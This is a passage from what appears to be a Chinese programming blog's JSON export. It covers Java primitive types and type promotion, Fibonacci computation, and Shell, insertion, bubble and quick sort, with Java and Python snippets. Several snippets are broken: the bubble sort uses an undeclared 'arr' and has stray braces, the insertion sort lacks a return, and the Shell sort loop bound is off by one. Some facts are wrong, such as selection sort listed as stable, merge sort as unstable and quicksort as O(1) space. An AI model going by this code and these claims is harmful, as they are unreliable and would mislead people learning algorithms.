而如果是下面的情况，就会出问题： 123int count = 100000000;int price = 1999;long totalPrice = count * price; 编译没任何问题，但结果却输出的是负数，这是因为两个 int 相乘得到的结果是 int, 相乘的结果超出了 int 的代表范围。这种情况，一般把第一个数据转换成范围大的数据类型再和其他的数据进行运算。 总结Java定义了如下的自动提升规则： 当运算符为取正运算符（+）。取负运算符（-）或按位取反运算符（~）时，如果任一操作数的类型为byte、char或short，则先被转换为int，再参与运算，运算结果的类型为int； 整个算术表达式的数据类型自动提升到表达式中最高等级操作数同样的类型，比如： 如果运算符任意一方的类型为double，则（在执行运算前）另一方会被自动转换为double类型，且运算结果也为double类型； 如果运算符任意一方的类型为float，则（在执行运算前）另一方会被自动转换为float类型，且运算结果也为float类型； 如果运算符任意一方的类型为long，则（在执行运算前）另一方会被自动转换为long类型，且运算结果也为long类型。 1234567891011121314151617public static void main(String[] args) &#123; // 下面2行代码出错，shortValue类型参与运算，类型自动提升到int // 将一个int类型的值赋给一个short类型的值，编译不过 short shortValue = 5; shortValue = shortValue - 2; // 下面4行代码正确，3个不同类型的值参与运算，类型提升到最高的类型 // double，int，byte中，double类型最高，所以结果double类型 byte byteValue = 4; int intValue = 1; double doubleValue = 2.33; double result = byteValue + intValue + doubleValue; System.out.println(byteValue + intValue + doubleValue); // 下面代码的类型同样为double System.out.println(doubleValue / intValue); &#125; Reference Java 基本数据类型 - https://www.runoob.com/java/java-basic-datatypes.html Java支持的8种基本数据类型 - https://blog.csdn.net/thebigdipperbdx/article/details/81047288 java基本数据类型转换 - https://www.cnblogs.com/ggjucheng/archive/2012/11/20/2779081.html 彻底理解Java中的基本数据类型转换（自动、强制、提升）- https://segmentfault.com/a/1190000015349453 java基本类型及相互转换 - https://blog.csdn.net/QQ736238785/article/details/79633452 Oracle 5.6.2. Binary Numeric Promotion - http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.6.2","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】基本数据类型 - Java支持的8种基本数据类型","date":"2019-06-28T02:34:57.000Z","path":"2019/06/28/【Java】基本数据类型-Java支持的8种基本数据类型/","text":"列举byte（字节型）、short（短整型）、int（整型）、long（长整型）、float（单精度浮点型）、double（双精度浮点型）、boolean（布尔型）、char（字符型）。 对应包装类java.lang.Byte、java.lang.Short、java.lang.Integer、java.lang.Long、java.lang.Float、java.lang.Double、java.lang.Boolean、java.lang.Character 详细划分具体可分为四类： 整型 byte short int long 浮点型 float double 逻辑型 boolean（它只有两个值可取 true false） 字符型 char 汇总 序号 数据类型 大小/位 封装类 默认值 可表示数据范围 1 byte(位) 8 Byte 0 -128 ~ 127 2 short(短整数) 16 Short 0 -32768 ~ 32767 3 int(整数) 32 Integer 0 -2147483648 ~ 2147483647 4 long(长整数) 64 Long 0L -9223372036854775808 ~ 9223372036854775807 5 float(单精度) 32 Float 0.0F 1.4E-45 ~ 3.4028235E38 6 double(双精度) 64 Double 0.0D 4.9E-324 ~ 1.7976931348623157E308 7 char(字符) 16 Character 空 0 ~ 65535 8 boolean 8 Boolean flase true或false 整型 - byte byte 数据类型是8位、有符号的，以二进制补码表示的整数； 最小值是 -128（-2^7）； 最大值是 127（2^7-1）； 默认值是 0； byte 类型用在大型数组中节约空间，主要代替整数，因为 byte 变量占用的空间只有 int 类型的四分之一； 例子：byte a = 100，byte b = -50。 整型 - short short 数据类型是 16 位、有符号的以二进制补码表示的整数 最小值是 -32768（-2^15）； 最大值是 32767（2^15 - 1）； Short 数据类型也可以像 byte 那样节省空间。一个short变量是int型变量所占空间的二分之一； 默认值是 0； 例子：short s = 1000，short r = -20000。 整型 - int int 数据类型是32位、有符号的以二进制补码表示的整数； 最小值是 -2,147,483,648（-2^31）； 最大值是 2,147,483,647（2^31 - 1）； 一般地整型变量默认为 int 类型； 默认值是 0 ； 例子：int a = 100000, int b = -200000。 整型 - long： long 数据类型是 64 位、有符号的以二进制补码表示的整数； 最小值是 -9,223,372,036,854,775,808（-2^63）； 最大值是 9,223,372,036,854,775,807（2^63 -1）； 这种类型主要使用在需要比较大整数的系统上； 默认值是 0L； 例子： long a = 100000L，Long b = -200000L。“L”理论上不分大小写，但是若写成”l”容易与数字”1”混淆，不容易分辩。所以最好大写。 浮点型 - float float 数据类型是单精度、32位、符合IEEE 754标准的浮点数； float 在储存大型浮点数组的时候可节省内存空间； 默认值是 0.0f； 浮点数不能用来表示精确的值，如货币； 例子：float f1 = 234.5f。 浮点型 - double double 数据类型是双精度、64 位、符合IEEE 754标准的浮点数； 浮点数的默认类型为double类型； double类型同样不能表示精确的值，如货币； 默认值是 0.0d； 例子：double d1 = 123.4。 逻辑型 - boolean boolean数据类型表示一位的信息； 只有两个取值：true 和 false； 这种类型只作为一种标志来记录 true/false 情况； 默认值是 false； 例子：boolean one = true。 字符型 - char char类型是一个单一的 16 位 Unicode 字符； 最小值是 \\u0000（即为0）； 最大值是 \\uffff（即为65,535）； char 数据类型可以储存任何字符； 例子：char letter = ‘A’;。 类型默认值下表列出了 Java 各个类型的默认值： 数据类型 默认值 byte 0 short 0 int 0 long 0L float 0.0f double 0.0d char ‘u0000’ String (or any object) null boolean false Reference Java 基本数据类型 - https://www.runoob.com/java/java-basic-datatypes.html Java支持的8种基本数据类型 - https://blog.csdn.net/thebigdipperbdx/article/details/81047288 java基本数据类型转换 - https://www.cnblogs.com/ggjucheng/archive/2012/11/20/2779081.html 彻底理解Java中的基本数据类型转换（自动、强制、提升）- https://segmentfault.com/a/1190000015349453 java基本类型及相互转换 - https://blog.csdn.net/QQ736238785/article/details/79633452 Oracle 5.6.2. Binary Numeric Promotion - http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.6.2","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Algorithm】计算斐波纳契数（Fibonacci Number）","date":"2019-06-27T02:32:57.000Z","path":"2019/06/27/【Algorithm】计算斐波纳契数/","text":"问题描述Fibonacci数（Fibonacci Number）的定义是：F(n) = F(n - 1) + F(n - 2)，并且F(0) = 0，F(1) = 1。对于任意指定的整数n（n ≥ 0），计算F(n)的精确值 递归法一个看起来很直观、用起来很恐怖的算法就是递归法。根据Fibonacci的递推公式，对于输入的n，直接递归地调用相同的函数分别求出F(n - 1)和F(n - 2)，二者相加就是结果。递归的终止点就是递推方程的初值，即n取0或1的时候。 程序写出来那也是相当的简洁直观： 12345678private static long recursiveFibonacci(int n) &#123; if (n == 0) return 0; if (n == 1) return 1; return recursiveFibonacci(n - 1) + recursiveFibonacci(n - 2);&#125; 非递归算法 - 递推法虽然只是一字之差，但递推法的复杂度要小的多。这个方法就是按照递推方程，从n = 0和n = 1开始，逐个求出所有小于n的Fibonacci数，最后就可以算出F(n)。由于每次计算值需要用到前两个Fibonacci数，更小的数就可以丢弃了，可以将空间复杂度降到最低。算法如下： 12345678910111213141516171819private static long fibonacci1(int n) &#123; int result[] = &#123;0, 1&#125;; if (n &lt; 2) return result[n]; long fibFrontPart = 1; long fibTailPart = 0; long fibN = 0; int i = 2; while (i &lt;= n) &#123; fibN = fibFrontPart + fibTailPart; fibTailPart = fibFrontPart; fibFrontPart = fibN; i++; &#125; return fibN;&#125; 可以很明显的看到计算第n项的时间复杂度为 T(n) = O(n) 非递归算法 - 公式算法对于斐波那契数列这个常见的递推数列，其第nn项的值的通项公式如下：$$Fn=\\frac{1}{\\sqrt{5}}[(\\frac{1+\\sqrt{5}}{2})^n−(\\frac{1−\\sqrt{5}}{2})^n]$$该公式可以通过构造等比数列或者特征方程法等方法求出，也可以利用数学归纳法进行证明，在这里不多介绍。如果将公式转化成Python代码则有以下程序： 1234def Fibonacci_formula(n): root_five = 5**0.5 result = (((1 + root_five) / 2)**n - ((1 - root_five) / 2)**n) / root_five return int(result) 该方法虽然看起来高效，但是由于涉及大量浮点运算，在nn增大时浮点误差不断增大会导致返回结果不正确甚至数据溢出。由于这种不可靠性，一般不采用这种方法进行计算。 矩阵算法Reference 五种方法计算斐波那契数列的第n项- http://blog.zhengyi.one/fibonacci-in-logn.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】排序算法 - 希尔排序（Shell Sort）","date":"2019-06-26T04:04:33.000Z","path":"2019/06/26/【Algorithm】排序算法-希尔排序/","text":"希尔排序（Shell Sort）希尔排序（Shell Sort），又Shell在1959年发明，是第一个突破$O(n^2)$的排序算法，是简单插入排序的改进版。它与插入排序的不同之处在于，它会优先比较距离较远的元素。希尔排序又叫缩小增量排序（diminishing increment sort）。 插入排序（Insertion Sort）的一个重要的特点是，如果原始数据的大部分元素已经排序，那么插入排序的速度很快（因为需要移动的元素很少）。从这个事实我们可以想到，如果原始数据只有很少元素，那么排序的速度也很快。 希尔排序就是基于这两点对插入排序作出了改进。 插入排序与希尔排序插入排序很循规蹈矩，不管数组分布是怎么样的，依然一步一步的对元素进行比较，移动，插入，比如[5,4,3,2,1,0]这种倒序序列，数组末端的0要回到首位置很是费劲（比较和移动元素均需n-1次）。 而希尔排序在数组中采用跳跃式分组的策略，通过某个增量将数组元素划分为若干组（每组包含数量相同的元素），然后以每个分组作为一个集合单元，并对这个集合单元内的数据元素（每个分组中的数据元素）进行插入排序，随后逐步缩小增量（并得到新的组），继续以组作为一个集合单元，进行插入排序操作，直至增量为1。 希尔排序通过这种策略使得整个数组在初始阶段达到从宏观上看基本有序（即小的基本在前，大的基本在后）。然后逐渐缩小增量，到增量为1时，其实多数情况下只需微调即可，不会涉及过多的数据移动。 希尔排序（Shell Sort）我们来看下希尔排序的基本步骤，在此我们选择增量（gap）等于当前待排序数组的长度的一半（即，gap=length/2），缩小增量继续以gap = gap/2的方式，这种增量选择我们可以用一个序列来表示，{n/2,(n/2)/2…1}，称为增量序列。增量值等于一个小组中元素的数量。 希尔排序的增量序列的选择与证明是个数学难题，我们选择的这个增量序列是比较常用的，也是希尔建议的增量，称为希尔增量，但其实这个增量序列不是最优的。 在希尔排序中，首先，把相对较大的待排序的数据集合分割成若干个小组，然后对每一个小组（中的数据）分别进行插入排序，此时，插入排序所作用的数据量比较小（仅作用于一个小组），因此插入的效率比较高。 可以看出，上图中，数组的长度为 8，因此在第一轮时，增量为 4（即当前待排序数组的长度的一半）。这意味着，将数组中元素分为 4 组，继而每组包含 2 个元素。 那么，如果将元素归到这 4 组呢？下标相隔 4 的元素互为一组，比如这个例子中a[0]与a[4]是一组、a[1]与a[5]是一组…，这里的差值（距离）被称为增量： 对每个分组进行插入排序后，各个分组就变成有序的了（在任意一个组中，数据元素的大小从左向右递增）： 注意，这时候，整个数组变得部分有序了（即，从整体上看，小元素大体在前面，大元素大体在后面。虽然有序程度可能不是很高）： 然后缩小增量（即增量变为当前增量的一半），此后继续划分分组。此时，每个分组元素个数就相对增多了，但是，数组变的部分有序了，插入排序效率同样比高： 同理对每个分组进行排序（插入排序），使其每个分组各自有序： 最后再设置增量为当前增量的一半，这使得则整个数组被分为一组，此时，整个数组已经接近有序了，插入排序效率高。 图解待排序数组长度为 10 ，假设计算出的排序区间为 4 ，那么我们第一次比较应该是用第 5 个数据与第 1 个数据相比较。 调换后的数据为[ 7，2，5，9，8，10，1，15，12，3 ]，然后指针右移，第 6 个数据与第 2 个数据相比较。 指针右移，继续比较。 如果交换数据后，发现”当前索引值减去当前区间值”&gt;0（这说明前面存在数据），那么继续比较。比如下面这张图中描述的场景，则需要12 和 8 相比较，原地不动后，指针从 12 跳到 8 身上，继续减去当前区间值后，值仍大于 0，因此 8 和 7 相比较。 比较完之后的效果是 7，8，12 三个数为有序排列。 当最后一个元素比较完之后，我们会发现大部分值比较大的数据都似乎调整到数组的中后部分了。 假设整个数组比较长的话，比如有 100 个数据，那么区间值肯定是四五十，调整后区间值再缩小成一二十还会重新调整一轮，直到最后区间值缩小为 1，就是真正的排序来了。 指针右移，继续比较： 重复步骤，即可完成排序，重复的图就不多画了。 我们可以发现，当区间值为 1 的时候，它使用的排序方式就是插入排序。 Solution1234567891011121314151617private static int[] shellSort(int[] array) &#123; if (array == null || array.length &lt; 2) return array; for (int gap = array.length / 2; gap &gt;= 1; gap = gap / 2) &#123; for (int i = gap;i&lt;array.length;i++)&#123; int temp = array[i]; int j; for (j = i;j &gt;gap &amp;&amp; array[j - gap] &gt;temp;j = j- gap) array[j] = array[j - gap]; array[j]= temp; &#125; &#125; return array;&#125; 性能分析希尔排序平均时间复杂度是$O(nlog_2n)$（约为$O(n^{1.3})$），最坏情况下为$O(n^2)$，最好情况下为$O(n)$。其中分组的合理性会对算法产生重要的影响。现在多用D.E.Knuth的分组方法。 希尔排序稳定性希尔排序是不稳定的算法，它满足稳定算法的定义。对于相同的两个数，可能由于分在不同的组中而导致它们的顺序发生变化。 算法稳定性 ：假设在数列中存在a[i]=a[j]，若在排序之前，a[i]在a[j]前面；并且排序之后，a[i]仍然在a[j]前面。则这个排序算法是稳定的！ Reference 十大经典排序算法（动图演示）- https://www.cnblogs.com/onepixel/p/7674659.html 希尔排序 - https://zhuanlan.zhihu.com/p/36297994 图解排序算法(二)之希尔排序 - https://www.cnblogs.com/chengxiao/p/6104371.html 图解希尔排序 - https://www.itcodemonkey.com/article/3286.html 数据结构基础 希尔排序 之 算法复杂度浅析 - https://blog.csdn.net/u013630349/article/details/48250109 希尔排序 - https://www.cnblogs.com/skywang12345/p/3597597.html GeeksforGeeks Shell Sort - https://www.geeksforgeeks.org/shellsort/","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】排序算法 - 插入排序（Insertion Sort）","date":"2019-06-25T14:10:34.000Z","path":"2019/06/25/【Algorithm】排序算法-插入排序/","text":"插入排序（Insertion Sort）插入排序（Insertion-Sort）是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。 插入排序的思想和我们打扑克摸牌的时候一样，从牌堆里一张一张摸起来的牌都是乱序的，我们会把摸起来的牌插入到左手中合适的位置，让左手中的牌时刻保持一个有序的状态。 那如果我们不是从牌堆里摸牌，而是左手里面初始化就是一堆乱牌呢？ 一样的道理，我们把乱序的牌往手的右边挪一挪，把手的左边空出一点位置来，然后在乱牌中抽一张出来，插入到左边，再抽一张出来，插入到左边，再抽一张，插入到左边，每次插入都插入到左边合适的位置，时刻保持左边的牌是有序的，直到右边的牌抽完，则排序完毕。 图解 1数组初始化：[ 8，2，5，9，7 ]，我们把数组中的数据分成两个区域，已排序区域和未排序区域，初始化的时候所有的数据都处在未排序区域中，已排序区域是空。 第一轮，从未排序区域中随机拿出一个数字，既然是随机，那么我们就获取第一个，然后插入到已排序区域中，已排序区域是空，那么就不做比较，默认自身已经是有序的了。（当然了，第一轮在代码中是可以省略的，从下标为1的元素开始即可） 第二轮，继续从未排序区域中拿出一个数，插入到已排序区域中，这个时候要遍历已排序区域中的数字挨个做比较，比大比小取决于你是想升序排还是想倒序排，这里排升序： 第三轮，排 5 ： 第四轮，排 9 ： 第五轮，排 7 排序结束。 图解 2 动画演示 Solution123456789101112131415private static int[] insertionSort(int[] arr) &#123; int n = arr.length; for (int i = 1; i &lt; n; ++i) &#123; int value = arr[i]; int j;//插入的位置 for (j = i-1; j &gt;= 0; j--) &#123; if (arr[j] &gt; value) &#123; arr[j+1] = arr[j];//移动数据 &#125; else &#123; break; &#125; &#125; arr[j+1] = value; //插入数据 &#125;&#125; 从代码里我们可以看出，如果找到了合适的位置，就不会再进行比较了，就好比牌堆里抽出的一张牌本身就比我手里的牌都小，那么我只需要直接放在末尾就行了，不用一个一个去移动数据腾出位置插入到中间。 所以说，最好情况的时间复杂度是 O(n)，最坏情况的时间复杂度是 $O(n^2)$，然而时间复杂度这个指标看的是最坏的情况，而不是最好的情况，所以插入排序的时间复杂度是 $O(n^2)$。 性能最好情况下的时间复杂度是 O(n)，最坏情况下的时间复杂度是 $O(n^2)$，然而时间复杂度这个指标看的是最坏的情况，而不是最好的情况，所以插入排序的时间复杂度是 $O(n^2)$。 Reference 十大经典排序算法（动图演示）- https://www.cnblogs.com/onepixel/p/7674659.html https://visualgo.net/en/sorting GeeksforGeeks Insertion Sort - https://www.geeksforgeeks.org/insertion-sort/ 这或许是东半球讲十大排序算法最好的一篇文章 - https://cxyxiaowu.com/articles/2019/06/11/1560233679033.html 图解排序算法(一)之3种简单排序(选择，冒泡，直接插入) - https://www.cnblogs.com/chengxiao/p/6103002.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】排序（Sorting）算法","date":"2019-06-25T11:38:49.000Z","path":"2019/06/25/【Algorithm】排序算法/","text":"排序算法的比较 算法 平均时间复杂度 最好时间复杂度 最坏时间复杂度 空间复杂度 排序方式 稳定性 备注 冒泡排序 $O(N^2)$ $O(N^2)$ $O(N^2)$ 1 In-place 稳定 选择排序 $O(N^2)$ $O(N^2)$ $O(N^2)$ 1 In-place 稳定 插入排序 $O(N^2)$ $O(N)$ $O(N^2)$ 1 In-place 稳定 时间复杂度和初始顺序有关 希尔排序 $O(Nlog_2N)$ $O(Nlog_2N)$ $O(Nlog_2N)$ 1 In-place 不稳定 改进版插入排序 归并排序 $O(Nlog_2N)$ $O(Nlog_2N)$ $O(Nlog_2N)$ $O(N)$ Out-place 不稳定 快速排序 $O(Nlog_2N)$ $O(Nlog_2N)$ $O(N^2)$ 1 In-place 不稳定 堆排序 $O(Nlog_2N)$ $O(Nlog_2N)$ $O(Nlog_2N)$ 1 In-place 不稳定 桶排序 O(N + k) O(N + k) $O(N^2)$ $O(N)$ Out-place 稳定","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】排序算法 - 冒泡排序（Bubble Sort）","date":"2019-06-25T11:35:13.000Z","path":"2019/06/25/【Algorithm】排序算法-冒泡排序/","text":"冒泡排序（Bubble Sort）冒泡排序（Bubble Sort）是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果它们的顺序错误就把它们交换过来。走访数列的工作是重复地进行，直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。 图解冒泡第一轮冒泡以 [ 8，2，5，9，7 ] 这组数字来做示例。 从左往右依次冒泡，将小的元素往右冒泡（移动）： 首先比较第一个数和第二个数的大小，我们发现 2 比 8 要小，那么保持原位，不做改动。位置还是 8，2，5，9，7 。 指针往右移动一格，接着比较： 比较第二个数和第三个数的大小，发现 2 比 5 要小，所以位置交换，交换后数组更新为：[ 8，5，2，9，7 ]。 指针再往右移动一格，继续比较： 比较第三个数和第四个数的大小，发现 2 比 9 要小，所以位置交换，交换后数组更新为：[ 8，5，9，2，7 ] 同样，指针再往右移动，继续比较： 比较第 4 个数和第 5 个数的大小，发现 2 比 7 要小，所以位置交换，交换后数组更新为：[ 8，5，9，7，2 ] 下一步，指针再往右移动，发现已经到底了，则本轮冒泡结束，处于最右边的 2 就是已经排好序的数字。 通过这一轮不断的对比交换，数组中最小的数字移动到了最右边。 第二轮冒泡接下来继续第二轮冒泡： 由于右边的 2 已经是排好序的数字，就不再参与比较，所以本轮冒泡结束，本轮冒泡最终冒到顶部的数字 5 也归于有序序列中，现在数组已经变化成了[ 8，9，7，5，2 ]。 第三轮冒泡让我们开始第三轮冒泡吧！ 由于 8 比 7 大，所以位置不变，此时第三轮冒泡也已经结束，第三轮冒泡的最后结果是[ 9，8，7，5，2 ] 第四轮冒泡紧接着第四轮冒泡： 9 和 8 比，位置不变，即确定了 8 进入有序序列，那么最后只剩下一个数字 9 ，放在末尾，自此排序结束。 动图演示 Solution1234567891011121314private static int[] bubbleSort(int[] array) &#123; int n = arr.length; for (int i = 0; i &lt; n-1; i++) for (int j = 0; j &lt; n-i-1; j++) if (arr[j] &gt; arr[j+1]) &#123; // swap arr[j+1] and arr[i] int temp = arr[j]; arr[j] = arr[j+1]; arr[j+1] = temp; &#125; &#125; &#125;&#125; 冒泡优化冒泡有一个最大的问题就是这种算法不管不管这个数组有序还是没序，都会将双层循环执行。 举个数组例子：一个有序的数组，[ 5，6，7，8，9 ]，显然这个数组已经是有序的了，而如果将它传入冒泡排序函数中，双层循环也会从头到尾被完成执行。 而事实上，针对这个问题，我们可以设定一个临时遍历来标记该数组是否已经有序，如果有序了就不用遍历了。 1234567891011121314151617public static void sort(int arr[])&#123; for( int i = 0;i &lt; arr.length - 1 ; i++ )&#123; boolean isSort = true; for( int j = 0;j &lt; arr.length - 1 - i ; j++ )&#123; int temp = 0; if(arr[j] &lt; arr[j + 1])&#123; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; isSort = false; &#125; &#125; if(isSort)&#123; break; &#125; &#125;&#125; Reference 十大经典排序算法（动图演示）- https://www.cnblogs.com/onepixel/p/7674659.html https://visualgo.net/en/sorting 这或许是东半球讲十大排序算法最好的一篇文章 - https://cxyxiaowu.com/articles/2019/06/11/1560233679033.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】排序算法 - 快速排序（Quick Sort）","date":"2019-06-25T09:31:29.000Z","path":"2019/06/25/【Algorithm】排序算法-快速排序/","text":"快速排序（Quick Sort）快速排序的核心思想也是分治法（Divide and Conquer Method），分而治之。 它的实现方式是每次从序列中选出一个基准值（pivot），其他数依次和基准值做比较，比基准值大的放右边，比基准值小的放左边，然后再对左边和右边的两组数分别选出一个基准值，进行同样的比较移动，重复步骤，直到最后都变成单个元素，整个数组就成了有序的序列。 单边扫描Solution12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/* This function takes last element as pivot, places the pivot element at its correct position in sorted array, and places all smaller (smaller than pivot) to left of pivot and all greater elements to right of pivot */int partition(int arr[], int low, int high) &#123; int pivot = arr[high]; int i = (low-1); // index of smaller element for (int j=low; j&lt;high; j++) &#123; // If current element is smaller than or // equal to pivot if (arr[j] &lt;= pivot) &#123; i++; // swap arr[i] and arr[j] int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125; &#125; // swap arr[i+1] and arr[high] (or pivot) int temp = arr[i+1]; arr[i+1] = arr[high]; arr[high] = temp; return i+1; &#125; /* The main function that implements QuickSort() arr[] --&gt; Array to be sorted, low --&gt; Starting index, high --&gt; Ending index */void sort(int arr[], int low, int high) &#123; if (low &lt; high) &#123; /* pi is partitioning index, arr[pi] is now at right place */ int pi = partition(arr, low, high); // Recursively sort elements before // partition and after partition sort(arr, low, pi-1); sort(arr, pi+1, high); &#125; &#125; 双边扫描Solution123456789101112131415161718192021222324252627282930313233343536373839404142public class Solution &#123; public Random rand; public void sortIntegers2(int[] A) &#123; rand = new Random(); // write your code here quickSort(A, 0, A.length - 1); &#125; public void quickSort(int[] A, int start, int end) &#123; if (start &gt;= end) &#123; return; &#125; // 注意，这里再选择 pivot 时，采用了生成一个随机数的方法，这样做的结果是使快排算法的时间复杂度无限趋近于 nlogn， int index = rand.nextInt(end - start + 1) + start; int pivot = A[index]; int left = start; int right = end; while (left &lt;= right) &#123; while (left &lt;= right &amp;&amp; A[left] &lt; pivot) &#123; left ++; &#125; while (left &lt;= right &amp;&amp; A[right] &gt; pivot) &#123; right --; &#125; if (left &lt;= right) &#123; int temp = A[left]; A[left] = A[right]; A[right] = temp; left ++; right --; &#125; &#125; // A[start... right] quickSort(A, start, right); // A[left ... end] quickSort(A, left, end); &#125;&#125; 解析假设我们现在对“6 1 2 7 9 3 4 5 10 8”这个 10 个数进行排序。首先在这个序列中随便找一个数作为基准数。 不要被这个名词吓到了，就是找一个用来参照的数，待会你就知道它用来做啥的了。 为了方便，就让第一个数 6 作为基准数吧。接下来，需要将这个序列中所有比基准数大的数放在 6 的右边，比基准数小的数放在 6 的左边，类似下面这种排列。 3 1 2 5 4 6 9 7 10 8 在初始状态下，数字 6 在序列的第 1 位。我们的目标是将 6 挪到序列中间的某个位置，假设这个位置是 k。现在就需要寻找这个 k，并且以第 k 位为分界点，左边的数都小于等于 6，右边的数都大于等于 6。想一想，你有办法可以做到这点吗？ 方法其实很简单：分别从初始序列“6 1 2 7 9 3 4 5 10 8”两端开始“探测”。先从右往左找一个小于 6 的数，再从左往右找一个大于 6 的数，然后交换他们。这里可以用两个变量 i 和 j，分别指向序列最左边和最右边。我们为这两个变量起个好听的名字“哨兵 i”和“哨兵 j”。刚开始的时候让哨兵 i 指向序列的最左边（即 i=1），指向数字 6。让哨兵 j 指向序列的最右边（即 j=10），指向数字 8。 首先哨兵 j 开始出动。因为此处设置的基准数是最左边的数，所以需要让哨兵 j 先出动，这一点非常重要。哨兵 j 一步一步地向左挪动（即 j–），直到找到一个小于 6 的数停下来。接下来哨兵 i 再一步一步向右挪动（即 i++），直到找到一个数大于 6 的数停下来。最后哨兵 j 停在了数字 5 面前，哨兵 i 停在了数字 7 面前。 现在交换哨兵 i 和哨兵 j 所指向的元素的值。交换之后的序列如下： 到此，第一次交换结束。接下来开始哨兵 j 继续向左挪动（再友情提醒，每次必须是哨兵 j 先出发）。他发现了 4（比基准数 6 要小，满足要求）之后停了下来。哨兵 i 也继续向右挪动的，他发现了 9（比基准数 6 要大，满足要求）之后停了下来。 此时再次进行交换，交换之后的序列如下： 第二次交换结束，“探测”继续。哨兵 j 继续向左挪动，他发现了 3（比基准数 6 要小，满足要求）之后又停了下来。哨兵 i 继续向右移动，糟啦！此时哨兵 i 和哨兵 j 相遇了，哨兵 i 和哨兵 j 都走到 3 这里了。说明此时“探测”结束。 我们将基准数 6 和 3 进行交换： 交换之后的序列如下： 到此第一轮“探测”真正结束。此时以基准数 6 为分界点，6 左边的数都小于等于 6，6 右边的数都大于等于 6。回顾一下刚才的过程，其实哨兵 j 的使命就是要找小于基准数的数，而哨兵 i 的使命就是要找大于基准数的数，直到 i 和 j 碰头为止。 OK，解释完毕。现在基准数 6 已经归位，它正好处在序列的第 6 位。此时我们已经将原来的序列，以 6 为分界点拆分成了两个序列，左边的序列是“3 1 2 5 4”，右边的序列是“ 9 7 10 8 ”。 接下来还需要分别处理这两个序列。因为 6 左边和右边的序列目前都还是很混乱的。不过不要紧，我们已经掌握了方法，接下来只要模拟刚才的方法分别处理 6 左边和右边的序列即可。现在先来处理 6 左边的序列现吧。 左边的序列是“3 1 2 5 4”。请将这个序列以 3 为基准数进行调整，使得 3 左边的数都小于等于 3，3 右边的数都大于等于 3。好了开始动笔吧。 如果你模拟的没有错，调整完毕之后的序列的顺序应该是。 2 1 3 5 4 OK，现在 3 已经归位。接下来需要处理 3 左边的序列“ 2 1 ”和右边的序列“5 4”。 对序列“ 2 1 ”以 2 为基准数进行调整，处理完毕之后的序列为“1 2”，到此 2 已经归位。序列“1”只有一个数，也不需要进行任何处理。至此我们对序列“ 2 1 ”已全部处理完毕，得到序列是“1 2”。序列“5 4”的处理也仿照此方法，最后得到的序列如下。 1 2 3 4 5 6 9 7 10 8 对于序列“9 7 10 8”也模拟刚才的过程，直到不可拆分出新的子序列为止。最终将会得到这样的序列，如下。 1 2 3 4 5 6 7 8 9 10 到此，排序完全结束。细心的同学可能已经发现，快速排序的每一轮处理其实就是将这一轮的基准数归位，直到所有的数都归位为止，排序就结束了。 性能分析快速排序的时间复杂度和归并排序一样，$O(n log_2 n)$，但这是建立在每次切分都能把数组一刀切两边所包含的元素个数差不多大的前提下。 而如果每次切分都切出了“左边部分不包含所有元素，而右边部分包含所有元素”，则此时在这个场景下快速排序的时间复杂度就从 $O(n log_2 n)$ 退化到了 $O(n^2)$。换句话说，快速排序的平均时间复杂度为$O(n log_2 n)$，而其最坏时间复杂度为 $O(n^2)$。 举个例子，比如排一个有序的序列，如[ 9，8，7，6，5，4，3，2，1 ]，如果在每次选取基准值（pivot）时， 都选择最左边的元素，那么在每次进行 partion 的过程，右指针都需要移动 n-1次（一直移动，直到指向最左边的元素）。在这种情况下，快速排序的时间复杂度就退化成了 $O(n^2)$。 显然，用什么方法来选取基准值，会影响对于特定数组使用快速排序的时间复杂度。 理论上来说，应该做到随机选取 pivot， 才能保证$O(n log_2 n)$ 的平均时间复杂度。 另外，快速排序的空间复杂度为 O(1)。 Reference 这或许是东半球讲十大排序算法最好的一篇文章 - https://cxyxiaowu.com/articles/2019/06/11/1560233679033.html 【图解数据结构】 一组动画彻底理解快速排序 - https://mp.weixin.qq.com/s?__biz=MzUyNjQxNjYyMg==&amp;mid=2247483963&amp;idx=1&amp;sn=dd58fafb86a43eec3dcdc2a2def8fcb7&amp;chksm=fa0e6dbacd79e4ac5dbf7f507264d2b5a4ecc9e78babbce9917b2e08ac05f5434c697839f46a&amp;scene=21#wechat_redirect https://www.geeksforgeeks.org/quick-sort/ 算法 3：最常用的排序——快速排序 - 